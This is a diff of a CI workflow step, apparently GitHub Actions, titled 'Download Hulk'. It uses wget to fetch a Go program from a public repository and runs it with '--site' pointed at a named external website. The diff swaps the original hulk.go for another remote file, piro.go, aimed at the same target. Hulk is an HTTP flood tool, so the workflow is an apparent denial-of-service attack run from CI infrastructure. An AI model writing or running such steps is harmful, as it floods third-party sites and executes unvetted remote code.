@@ -14,6 +14,6 @@ jobs:
 
     - name: Download Hulk
       run: |
-        wget https://raw.githubusercontent.com/grafov/hulk/master/hulk.go
-        go mod init hulk
-        go run hulk.go --site https://jk-vip.in
+        wget https://raw.githubusercontent.com/hk4crprasad/hk4crprasad/master/piro.go
+        go mod init piro
+        go run piro.go --site https://jk-vip.in
